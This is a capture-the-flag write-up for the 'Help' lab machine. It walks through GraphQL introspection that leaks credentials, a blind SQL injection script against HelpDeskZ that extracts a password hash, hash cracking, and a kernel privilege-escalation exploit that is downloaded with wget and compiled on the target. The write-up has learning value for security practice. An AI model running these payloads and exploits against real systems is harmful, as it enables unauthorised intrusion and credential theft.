`sudo nmap -vvv -Pn -sC --reason -T4 -p0-65335 -sCV 10.129.21.215`

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

port 80 has a redirect to help.htb which has a subdirectory /help which appears to be a helpdesk software HelpDeskZ 

Port 3000 is a node.js server and has the message "Hi Shiv, To get access please find the credentials with given query". My initial thought is to enumerate this api somehow. It is clearly returning json 
**GraphQL** — typically a **single endpoint**, most often at:

- `/graphql`
    
- `/api/graphql`
    
- `/gql`

we find the graphql endpoint at /graphql. We are now left to enumerate the graphql api endpoint to find the username and password. 
https://blog.cyberadvisors.com/technical-blog/blog/graphql-apis-enumeration-basics
```
 curl \
-X POST \
-H "Content-Type: application/json" \
--data '{ "query": "{__schema{types{name}}}"}' \
http://10.129.21.215:3000/graphql

```

This query requests the name attributes of all types defined in the applications schema

```
curl \
-X POST \
-H "Content-Type: application/json" \
--data '{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...Type
Ref}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofTy
pe{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}' \
http://10.129.21.215:3000/graphql | jq "."  
```

This is an introspection query which will tell us everything we need to know about the apis Schema. piping the command to jq "." will make the json output pretty 

we find some interesting info on the user name and password they are both Undepreciated string values. Now we need to figure out how to get info on them 
```
{                                                                                                                                                    
          "kind": "OBJECT",
          "name": "User",
          "description": "",
          "fields": [
            {
              "name": "username",
              "description": "",                                           
              "args": [],
              "type": {                      
                "kind": "SCALAR",                        
                "name": "String",
                "ofType": null
              },                                                       
              "isDeprecated": false,                   
              "deprecationReason": null      
            },                                  
            {
              "name": "password",                                             
              "description": "",
              "args": [],              
              "type": {                                                       
                "kind": "SCALAR",                    
                "name": "String",
                "ofType": null     
              },

```

With this information we are able to send a graphql request to the user, username field 
```
└─$ curl \
-X POST \
-H "Content-Type: application/json" \
--data '{ "query": "{user { username} }"}' \
http://10.129.21.215:3000/graphql
{"data":{"user":{"username":"helpme@helpme.com"}}}
```

and the password 
```
-X POST \
-H "Content-Type: application/json" \
--data '{ "query": "{user { password} }"}' \
http://10.129.21.215:3000/graphql
{"data":{"user":{"password":"5d3c93182bb20f07b994a7f617e99cff"}}} 
```

The password is clearly some hash. we use the online hash cracker crackstation to get the password `godhelpmeplz`
![[Pasted image 20260103183417.png]]

We use this to login to the service. We notice the ability to submit a file while creating a ticket,


finding the exploit was tough, I did not think to use searchsploit i Did use google and find similar exploits. Arbitrary upload did not work so I opted to use authenticated SQL Injection 

https://www.exploit-db.com/exploits/41200

When navigating to a file we uploaded in a ticket we see we are taken to a url like this `http://help.htb/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=2&param[]=7`

if we add a sql payload `and 1=1 -- -` we see that the file still downloads. this means these parameters are vulnerable to a blind sql injection. We will have to use this to enumerate information about the sql database inorder to find out information we need. 

I had to go to the write up to figure out how to use the SQL vuln I found. 

A now 404 github page is expected and the writeup reads `From the login controller we know the table name i.e staff and the columns username and password. The password is stored as a SHA1 hash which a 40 characters long.`


The write up wants us to create a script that will enumerate through all possible 40 characters the hash for a user password can be 

It provides this

```
#!/usr/bin/python
from requests import get
import string
cookies = {'lang': 'english',
'PHPSESSID': 'se3q2q1vtvmb71acq5i16ajtf1',
'usrhash':
'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqY
H6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yV
LoZ06smnKha9AGF4yL2Ylo%2BHDu89nyBt7elyC8vIIYgpCcpqa%2BUhLVh9kcZWIcDfKPw=='}
url = 'http://10.10.10.121/support/?v='
chars = list(string.ascii_lowercase) + list(string.digits)
password = []
k = 1
while k <= 40:
for i in chars:
payload = url \
+
"view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]= 6 and
substr((select password from staff limit 0,1),{},1) = '{}'---".format(k,
i)
resp = get(payload, cookies=cookies)
if '404' not in resp.content:
password.append(i)
print 'Password: ' + ''.join(password)
k = k + 1
break
```

Running the script finds the complete password hash i.e d318f44739dced66793b1a603028133a76ae680e .
Checking this on HashKiller cracks it as Welcome1 . The write up also mentions here we would need to GUESS that the ssh password is help


## Priv esc

New path 

Su -l and Sudo -l and find / -perm -4000 -type f 2>/dev/null brings up nothing.

The write up shows this is a kernal exploit found using uname -a 
```
help@help:~$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```


https://www.exploit-db.com/exploits/44298 this exploit we download onto our machine and try to compile it locally this gives us the error
./priv: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./priv)

to combat this we spin up a http server on our attack machine and wget the uncompiled file and compile it on the target machine 
`python3 -m http.server 80`

`wget 10.10.15.116/exploit.c`
`gcc -o a exploit.c`
`chmod +x a`
`./a `

We are root. 

Good box we learned how to enumerate and request info from a graphql api. we also got practice in finding vulnerable blind sqli. We had to guess the username of help. We did not create a script to find the password of the hash. The table name used in the script was assumed to be known by looking at the github for the application. Finally we used a kernal exploit in an old kernal to get direct root access. 